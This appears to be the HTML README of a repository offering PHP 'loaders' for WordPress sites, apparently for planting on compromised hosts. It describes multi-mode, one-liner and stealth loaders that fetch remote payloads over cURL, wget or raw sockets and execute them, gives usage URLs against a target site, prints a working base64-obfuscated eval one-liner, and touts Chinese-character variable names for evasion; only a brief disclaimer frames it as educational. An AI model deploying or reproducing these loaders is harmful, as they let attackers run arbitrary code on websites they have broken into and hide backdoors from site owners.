<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
</head>
<body>

  <h1>🌀 WP-Loader Collection — Universal PHP Loaders</h1>
  <p><strong>🔥 Universal PHP loader collection</strong> created by 
    <a href="https://github.com/6ickzone" target="_blank">0x6ick</a>.  
    This repository contains different types of loaders (multi-mode, one-liner, stealth) designed to fetch and execute remote payloads.</p>

  <p><strong>⚠️ Disclaimer:</strong> This tool is provided for educational and research purposes only.  
  Any misuse or illegal activity is not the responsibility of the author.</p>

  <hr>

  <div class="section">
    <h2>📂 Repository Structure</h2>
    <pre><code>/loader/wp-loader.php    # Main multi-mode loader panel
/loader/b64loader.php           # One-liner base64 loader
/loader/loadman.php             # Stealth loader (cURL + file_get_contents) with Mandarin variables
/docs/                   # Optional per-mode documentation
</code></pre>
  </div>

  <div class="section">
    <h2>✨ Available Loaders</h2>
    
    1. wp-loader.php
Multi-mode loader panel with the following modes:
- curl → Loader using cURL
- curlman → Refactored curl loader
- tmp → Temporary file-based loader
- cache → Loader with cache mechanism
- curlv2 → Alternative curl loader
- wget → wget/curl + include method
- socket → Raw socket GET loader
- telegram → Author contact info

Usage:
http://target.com/wp-loader.php?mode=curl


     2. b64loader.php
One-liner base64 loader
- Decodes a URL from base64 → fetches → executes via eval
- Extremely short and stealthy

Example snippet:
<?= @eval("?>".file_get_contents(base64_decode("..."))); ?>


     3. loadman.php
Stealth loader with Mandarin style
- Function and variable names in Chinese characters (汉字)
- Flow: cURL → fallback to file_get_contents → eval
- Error output: "加载失败 (Failed to load)"

Usage:
http://target.com/loadman.php

  </div>

  <hr>

  <div class="section">
    <h2>📜 License</h2>
    <p><a href="http://www.wtfpl.net" target="_blank">WTFPL v2</a></p>
    <pre><code>
            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

 Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>

 Everyone is permitted to copy and distribute verbatim or modified
 copies of this license document, and changing it is allowed as long
 as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. You just DO WHAT THE FUCK YOU WANT TO.
</code></pre>
  </div>

  <div class="section">
    <h2>👤 Author</h2>
    <ul>
      <li><strong>0x6ick - 6ickzone</strong></li>
      <li>Telegram: <a href="https://t.me/Yungx6ick" target="_blank">@Yungx6ick</a></li>
    </ul>
  </div>

</body>
</html>
